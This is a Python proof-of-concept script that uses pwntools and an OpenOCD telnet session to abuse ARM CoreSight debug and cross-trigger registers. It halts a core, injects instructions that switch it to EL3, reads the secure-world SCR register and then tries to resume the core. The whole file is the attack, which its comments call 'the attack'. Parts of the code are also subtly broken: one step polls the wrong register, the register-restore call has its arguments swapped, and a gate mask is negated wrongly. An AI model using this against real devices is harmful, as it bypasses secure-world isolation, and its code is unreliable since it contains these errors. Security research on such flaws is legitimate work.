import pwn, time,re

# 0x80010000 is the base address of the debug registers on Core 0 to be accessed through mem_ap
DEBUG_REGISTER_ADDR = 0x80010000


# 0x80018000 is the base address of the cross trigger interface registers on Core 0 to be accessed through mem_ap
CTI_REGISTER_ADDR = 0x80018000
# Offsets
DBGDTRRX_OFFSET = 0x80
EDITR_OFFSET = 0x84
EDSCR_OFFSET = 0x88
DBGDTRTX_OFFSET = 0x8C
EDRCR_OFFSET = 0x90
OSLAR_OFFSET = 0x300
EDLAR_OFFSET = 0xFB0

# Bits in EDSCR
STATUS = 0x3f
ERR = 1 << 6
HDE = 1 << 14
ITE = 1 << 24

# Bits in EDRCR
CSE = 1 << 2

# Offsets of cross trigger registers
CTICONTROL_OFFSET = 0x0
CTIINTACK_OFFSET = 0x10
CTIAPPPULSE_OFFSET = 0x1C
CTIOUTEN0_OFFSET = 0xA0
CTIOUTEN1_OFFSET = 0xA4
CTITRIGOUTSTATUS_OFFSET = 0x134
CTIGATE_OFFSET = 0x140

# Bits in CTICONTROL
GLBEN = 1 << 0

# Bits in CTIINTACK
ACK0 = 1 << 0
ACK1 = 1 << 1

# Bits in CTIAPPPULSE
APPPULSE0 = 1 << 0
APPPULSE1 = 1 << 1

# Bits in CTIOUTEN<n>
OUTEN0 = 1 << 0
OUTEN1 = 1 << 1

# Bits in CTITRIGOUTSTATUS
TROUT0 = 1 << 0
TROUT1 = 1 << 1

# Bits in CTIGATE
GATE0 = 1 << 0
GATE1 = 1 << 1

# Values of EDSCR.STATUS
NON_DEBUG = 0x2
HLT_BY_DEBUG_REQUEST = 0x13

def change_target(target,p):
    command= "targets " +str(target)
    p.sendline(command.encode('ascii'))
    p.recvuntil(b'\r>')

def read32(address,p):
    command= "mdw "+hex(address)
    p.sendline(command.encode('ascii'))
    result=p.recvuntil(b'\r>')
    result_str = result.decode('utf-8')
    pattern = r': ([0-9a-fA-F]+) '
    match = re.search(pattern, result_str)
    value=match.group(1)
    value="0x"+value
    ret=int(value,16)
    return ret

def write32(address,value,p):
    command=f"mww {hex(address)} " + "{" + hex(value)+"}"
    p.sendline(command.encode('ascii'))
    p.recvuntil(b'\r>')

def halt(cpu_num,p):
    change_target(cpu_num+1,p)
    command='halt'
    p.sendline(command.encode('ascii'))
    result=p.recvuntil(b'\r>')
    change_target(0,p)

def resume(cpu_num,p):
    change_target(cpu_num+1,p)
    command='resume'
    p.sendline(command.encode('ascii'))
    result=p.recvuntil(b'\r>')
    change_target(0,p)

def execute_ins_via_itr(ins,p):
    #CLEAR PREVIOUS ERROR
    
    #write32(CSE,DEBUG_REGISTER_ADDR+EDRCR_OFFSET,p)

    #time.sleep(0.2)
    write32(DEBUG_REGISTER_ADDR+EDITR_OFFSET,ins,p)

    time.sleep(0.2)
def save_register(ins,p):
    execute_ins_via_itr(ins,p)
    execute_ins_via_itr(0x0e15ee00,p)
    return read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)

def restore_register(ins,value,p):
    write32(DEBUG_REGISTER_ADDR+DBGDTRRX_OFFSET,value,p)
    execute_ins_via_itr(0x0e15ee10,p)
    execute_ins_via_itr(ins,p)


def read_scr(p):
    #set cpu0 as target
    #halt cpu1 

    #set as target mem_ap to interact with debug registers
    change_target(0,p)

    #read the value of the register where SCR will be stored in order
    #to show that the value was not here from previous execution of the attack
    
    
    #step 1 unlock debug and cross trigger register
    write32(DEBUG_REGISTER_ADDR+EDLAR_OFFSET,0xC5ACCE55,p)
    write32(CTI_REGISTER_ADDR+EDLAR_OFFSET,0xC5ACCE55,p)
    write32(DEBUG_REGISTER_ADDR+OSLAR_OFFSET, 0X0,p)
    write32(CTI_REGISTER_ADDR+OSLAR_OFFSET, 0X0,p)

    #step 2 enable halting debug on the target processor
    reg=read32(DEBUG_REGISTER_ADDR+EDSCR_OFFSET,p)
    reg= reg | HDE
    write32(DEBUG_REGISTER_ADDR+EDSCR_OFFSET,reg,p)

    #step 3 send halt request to the target
    write32(CTI_REGISTER_ADDR+CTICONTROL_OFFSET,GLBEN,p)
    reg=read32(CTI_REGISTER_ADDR+CTIGATE_OFFSET,p)
    reg= reg & ~ GATE0
    write32(CTI_REGISTER_ADDR+CTIGATE_OFFSET,reg,p)
    reg=read32(CTI_REGISTER_ADDR+CTIOUTEN0_OFFSET,p)
    reg= reg |OUTEN0
    write32(CTI_REGISTER_ADDR+CTIOUTEN0_OFFSET,reg,p)
    reg=read32(CTI_REGISTER_ADDR+CTIAPPPULSE_OFFSET,p)
    reg= reg | APPPULSE0
    write32(CTI_REGISTER_ADDR+CTIAPPPULSE_OFFSET,reg,p)

    #step 4 wait for the target to halt
    reg= read32(DEBUG_REGISTER_ADDR+EDITR_OFFSET,p)
    while((reg & STATUS)!=HLT_BY_DEBUG_REQUEST):
        reg= read32(DEBUG_REGISTER_ADDR+EDSCR_OFFSET,p)
    reg=read32(CTI_REGISTER_ADDR+CTIINTACK_OFFSET,p)
    reg = reg | ACK0
    write32(CTI_REGISTER_ADDR+CTIINTACK_OFFSET,reg,p)
    reg=read32(CTI_REGISTER_ADDR+CTITRIGOUTSTATUS_OFFSET,p)

    while((reg & TROUT0)== TROUT0):
        reg=read32(CTI_REGISTER_ADDR+CTITRIGOUTSTATUS_OFFSET,p)
    


    #step 5 save the context 
    execute_ins_via_itr(0x0e15ee00,p)
    r0_old=read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)
    print("ro is " + hex(r0_old))
    dlr_old=save_register(0x0f35ee74,p)
    print("dlr is " + hex(dlr_old))

    #step 6 switch to EL3 to access secure resource
    # 0xf78f8003 <=> dcps3
    execute_ins_via_itr(0x8003f78f,p) 
    
    #step 7 read the SCR
    
    #0xee110f11 <=> mrc p15, 0, R0, c1, c1, 0
    execute_ins_via_itr(0x0f11ee11,p)

    # 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(0x0e15ee00,p)

    scr = read32(DEBUG_REGISTER_ADDR+DBGDTRTX_OFFSET,p)

    #step 8 restore the context
    
    restore_register(0x0f35ee64,dlr_old,p)
    write32(r0_old, DEBUG_REGISTER_ADDR + DBGDTRRX_OFFSET,p)
    execute_ins_via_itr(0x0e15ee10,p)
    

    #step 9 resume the target
    reg=read32(CTI_REGISTER_ADDR+CTIGATE_OFFSET,p)
    reg = reg | ~GATE1
    write32(CTI_REGISTER_ADDR+CTIGATE_OFFSET,reg,p)
    reg=read32(CTI_REGISTER_ADDR+CTIOUTEN1_OFFSET,p)
    reg= reg |OUTEN1
    write32(CTI_REGISTER_ADDR+CTIOUTEN1_OFFSET,reg,p)
    reg=read32(CTI_REGISTER_ADDR+CTIAPPPULSE_OFFSET,p)
    reg= reg | APPPULSE1
    write32(CTI_REGISTER_ADDR+CTIAPPPULSE_OFFSET,reg,p)

    #step 10 wait for the target to restart
    reg=read32(DEBUG_REGISTER_ADDR+EDSCR_OFFSET,p)
    while((reg & STATUS)!=NON_DEBUG):
        reg=read32(DEBUG_REGISTER_ADDR+EDSCR_OFFSET,p)
    reg=read32(CTI_REGISTER_ADDR+CTIINTACK_OFFSET,p)
    reg = reg | ACK1
    write32(CTI_REGISTER_ADDR+CTIINTACK_OFFSET,reg,p)
    reg=read32(CTI_REGISTER_ADDR+CTITRIGOUTSTATUS_OFFSET,p)
    while((reg & TROUT1)== TROUT1):
        reg=read32(CTI_REGISTER_ADDR+CTITRIGOUTSTATUS_OFFSET,p)


    #resume cpu_0
    #resume(0,p)


    print(f"All done, the value of SRC is {hex(scr)}")


    
telnet_process = pwn.process(['telnet', 'localhost', '4444'])
telnet_process.recvuntil(b'\r>')
read_scr(telnet_process)
